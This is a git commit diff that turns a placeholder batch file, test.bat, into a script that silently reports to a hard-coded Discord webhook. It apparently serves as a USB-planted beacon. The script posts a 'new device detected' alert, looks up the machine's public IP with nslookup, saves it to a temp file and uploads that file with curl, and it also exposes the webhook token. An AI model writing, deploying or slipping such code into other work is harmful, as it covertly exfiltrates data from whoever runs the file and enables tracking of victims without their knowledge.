77e54877fc077f99dc958e39e3647d78dcd3d77e
franus <98951386+franu5@users.noreply.github.com>
2023-04-01 22:12:32 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,5 +1,11 @@
 @echo off
 
-echo hello
+set "helper=https://discord.com/api/webhooks/1091412540560515102/EMUhiI4GkG43OupicZBbmhtu1tFrfEcmZ8_Lwi7gmIX2rw0qRnm6QQb7fz4budBNwx33"
 
-pause
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"***franu5 usb has detected new device! (%TIME%)*** \"}" %helper%
+
+
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```public ip address```\"}"  %helper%
+nslookup myip.opendns.com resolver1.opendns.com > %temp%/PublicIP.txt
+curl --silent --output /dev/null -F s=@"%temp%/PublicIP.txt" %helper%
+nslookup myip.opendns.com resolver1.opendns.com
